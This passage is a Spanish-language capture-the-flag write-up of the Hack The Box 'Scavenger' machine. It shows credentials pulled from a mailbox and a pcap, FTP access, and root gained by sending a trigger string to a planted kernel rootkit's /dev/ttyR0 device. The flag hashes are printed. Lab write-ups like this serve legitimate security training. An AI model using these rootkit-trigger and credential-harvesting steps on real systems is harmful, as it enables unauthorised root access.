+<p>Obtenemos unas credenciales validas pero que correspoden al mismo usuario <code>ib01c03</code>, ahora recordemos que cuando obtuvimos subdominios, se nos reporto uno asociado a <code>mail1.rentahacker.htb</code>, por ello podemos listar la ruta <code>/var/spool/mail</code> buscando información.</p>
+
+<pre><code class="language-bash">ls -l /var/spool/mail/*
+&gt; -rw-rw-r-- 1 root mail 1274 Dec 10  2018 /var/spool/mail/ib01c03
+-rw-rw---- 1 root mail 1043 Dec 11  2018 /var/spool/mail/support
+</code></pre>
+
+<p>Vemos que existe un correo el cual al leerlo obtenemos las credenciales del usuario <code>ib01ftp:YhgRt56_Ta</code>.</p>
+
+<pre><code class="language-bash">cat /var/spool/mail/ib01c03
+&gt; From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
+Return-path: &lt;support@ib01.supersechosting.htb&gt;
+Envelope-to: ib01c03@ib01.supersechosting.htb
+Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
+Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
+	(envelope-from &lt;support@ib01.supersechosting.htb&gt;)
+	id 1gWRtI-0000ZK-8Q
+	for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
+To: &lt;ib01c03@ib01.supersechosting.htb&gt;
+Subject: Re: Please help! Site Defaced!
+In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
+	&lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&gt;
+References: &lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&gt;
+X-Mailer: mail (GNU Mailutils 3.1.1)
+Message-Id: &lt;E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb&gt;
+From: support &lt;support@ib01.supersechosting.htb&gt;
+Date: Mon, 10 Dec 2018 21:10:56 +0100
+X-IMAPbase: 1544472964 2
+Status: O
+X-UID: 1
+
+&gt;&gt; Please we need your help. Our site has been defaced!
+&gt;&gt; What we should do now?
+&gt;&gt;
+&gt;&gt; rentahacker.htb
+
+Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
+Please check if there is any strange file in your web root and upload it to the ftp server:
+ftp.supersechosting.htb
+user: ib01ftp
+pass: YhgRt56_Ta
+
+Thanks.
+</code></pre>
+
+<p>Como las credenciales estan asociadas a <code>ftp</code> y el puerto se encuentra abierto probamos a conectarnos.</p>
+
+<pre><code class="language-bash">❯ ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:fmiracle): ib01ftp
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+dr-xrwx---    4 1005     1000         4096 Dec 10  2018 incidents
+226 Directory send OK.
+ftp&gt; cd incidents
+250 Directory successfully changed.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+dr-xrwx---    2 1005     1000         4096 Jan 30  2019 ib01c01
+dr-xrwx---    2 1005     1000         4096 Dec 10  2018 ib01c03
+226 Directory send OK.
+ftp&gt; cd ib01c01
+250 Directory successfully changed.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r--rw-r--    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
+-rw-r--r--    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
+-r--rw-r--    1 1005     1000          173 Dec 11  2018 notes.txt
+226 Directory send OK.
+</code></pre>
+
+<p>Al conectarnos vemos un archivo log, una nota y un archivo pcap, los cuales vamos a traernos a nuestra maquina.</p>
+
+<pre><code class="language-bash">ftp&gt; binary on
+200 Switching to Binary mode.
+ftp&gt; prompt off
+Interactive mode off.
+ftp&gt; mget *
+local: ib01c01.access.log remote: ib01c01.access.log
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ib01c01.access.log (10427 bytes).
+226 Transfer complete.
+10427 bytes received in 0.45 secs (22.5332 kB/s)
+local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
+226 Transfer complete.
+835084 bytes received in 4.99 secs (163.5452 kB/s)
+local: notes.txt remote: notes.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for notes.txt (173 bytes).
+226 Transfer complete.
+173 bytes received in 0.00 secs (861.9659 kB/s)
+</code></pre>
+
+<p>La nota nos da una pista.</p>
+
+<pre><code class="language-bash">❯ cat notes.txt
+After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!
+</code></pre>
+
+<p>Analizando la captura con <code>tshark</code> obtenemos una contraseña.</p>
+
+<pre><code class="language-bash">❯ tshark -r ib01c01_incident.pcap -Y "http.request.method==POST" -Tfields -e 'tcp.payload' | xxd -ps -r
+Running as user "root" and group "root". This could be dangerous.
+POST /admin530o6uisg/index.php?rand=1544475115839 HTTP/1.1
+Host: www.pwnhats.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.pwnhats.htb/admin530o6uisg/index.php?controller=AdminLogin&amp;token=de267fd50b09d00b04cca76ff620b201
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+cache-control: no-cache
+X-Requested-With: XMLHttpRequest
+Content-Length: 195
+ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=GetYouAH4t%21&amp;email=pwnhats%40pwnhats.htb&amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05bPOST /admin530o6uisg/index.php?controller=AdminCustomerThreads&amp;token=8d8e4db864318da7655c7f2d8175815f HTTP/1.1
+Host: www.pwnhats.htb
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+</code></pre>
+
+<p>Si urldecodeamos la contraseña, obtemos que es equivalente a <code>GetYouAH4t!</code>.</p>
+
+<pre><code class="language-bash">❯ php --interactive
+Interactive mode enabled
+
+php &gt; echo urldecode("GetYouAH4t%21");
+GetYouAH4t!
+php &gt;
+</code></pre>
+
+<p>Como el propieatio de la captura era el usuario <code>ib01c01</code> vamos a conectarnos con ese usuario haciendo uso de la credencial obtenida.</p>
+
+<pre><code class="language-bash">❯ ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:fmiracle): ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
+drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
+226 Directory send OK.
+</code></pre>
+
+<p>Ahora proderemos a traernos y visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">❯ cat user.txt
+e8dd26ca8a139f83116a1744aa6d1826
+</code></pre>
+
+<h2 id="escalada-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Si bien examinamos por encima el archivo <code>pcap</code> con la ayuda de <code>tshark</code>, vamos a volver a examinarlo esta vez mediante <code>wireshark</code>.</p>
+
+<p>Al abrirnos <code>wireshark</code>, vemos que en el archivo pcap existen peticiones <code>GET</code> a un archivo de nombre <code>root.c</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca8.PNG" alt="" /></p>
+
+<p>Si seguimos el fujo tcp para tratar de ver el contenido, obsevamos todo el script en <code>C</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca9.PNG" alt="" /></p>
+
+<p>Dentro del script, vemos una cadena <code>Got r00t</code>, que llama mucho la atención y podemos ponernos a pensar que se trata de un <code>rootkit</code> y si tratamos de investigar esa cadena del script, vemos un articulo que nos confirma que se trata de un <code>rootkit</code> y nos dice como podemos aprovecharnos de este.</p>
+
+<ul>
+  <li><a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485">https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485</a></li>
+</ul>
+
+<p>Basicamente lo que hace es cargar un modulo llamado <code>root.ko</code> y al enviar la cadena <code>echo "g0tR0ot" &gt; /dev/ttyR0; comando</code>, esta lo ejecutara como <code>root</code>.</p>
+
+<p>Probamos a ejecutar la cadena, pero vemos que lo ejecutamos como nuestro usuario, y esto quiero pensar que es debido a que si bien el proceso de <code>rootkit</code> es el mismo, la cadena debe de ser distinta.</p>
+
+<pre><code class="language-bash">❯ rlwrap python3 tty_over_http.py
+echo "g0tR0ot" &gt; /dev/ttyR0; whoami
+&gt; ib01c03
+</code></pre>
+
+<p>Por ello necesitamos encontrar el <code>root.ko</code> que en principio es el que carga el <code>rootkit</code>.</p>
+
+<p>Si nos volvemos a conectar como el usuario <code>ib01c01</code>, y listamos los archivo ocultos vemos uno inusual <code>...</code> y si ingresamos al directorio encontramos el <code>root.ko</code>.</p>
+
+<pre><code class="language-bash">❯ ftp 10.10.10.155
+Connected to 10.10.10.155.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.155:fmiracle): ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx------    4 1001     1004         4096 Sep 01  2021 .
+drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
+lrwxrwxrwx    1 0        0               9 Sep 01  2021 .bash_history -&gt; /dev/null
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
+drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
+226 Directory send OK.
+ftp&gt; cd ...
+250 Directory successfully changed.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
+226 Directory send OK.
+ftp&gt; 
+</code></pre>
+
+<p>Vamos a traernos el archivo y examinarlo con nuestra maquina con <code>radare2</code>.</p>
+
+<pre><code class="language-bash">ftp&gt; get root.ko
+local: root.ko remote: root.ko
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for root.ko (399400 bytes).
+226 Transfer complete.
+399400 bytes received in 3.94 secs (98.9888 kB/s)
+ftp&gt; quit
+</code></pre>
+
+<pre><code class="language-bash">❯ radare2 root.ko
+Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
+ -- give | and &gt; a try piping and redirection
+[0x08000070]&gt; aaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze all functions arguments/locals
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Finding and parsing C++ vtables (avrr)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information (aanr)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[0x08000070]&gt; afl
+0x08000070    1 8            sym.root_open
+0x08000080    1 9            sym.root_read
+0x08000090   11 359          sym.root_write
+0x080001f7    7 292          sym.root_init
+0x0800031b    1 82           sym.root_exit
+[0x08000070]&gt; s sym.root_write
+[0x08000090]&gt; pdf
+</code></pre>
+
+<p>Al examinarlo vemos que la cadena <code>g0tR0ot</code> fue reemplaza por la cadena en dos partes <code>g3tPr1v</code>, asi que vamos a probar mandando esta nueva cadena.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Scavenger/sca10.PNG" alt="" /></p>
+
+<pre><code class="language-bash">❯ rlwrap python3 tty_over_http.py
+echo "g3tPr1v" &gt; /dev/ttyR0; whoami
+&gt; root
+</code></pre>
+
+<p>Esta vez vemos que el <code>rootkit</code> si funciona, asi que ahora que tenemos privilegios como <code>root</code> solo nos quedaria visualizar la segunda flag <code>root.txt</code>.</p>
+
+<pre><code class="language-bash">echo "g3tPr1v" &gt; /dev/ttyR0; cat /root/root.txt
+&gt; 8c1482a3a42eb925f6e2a6ed49535065
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Scavenger - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Scavenger" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
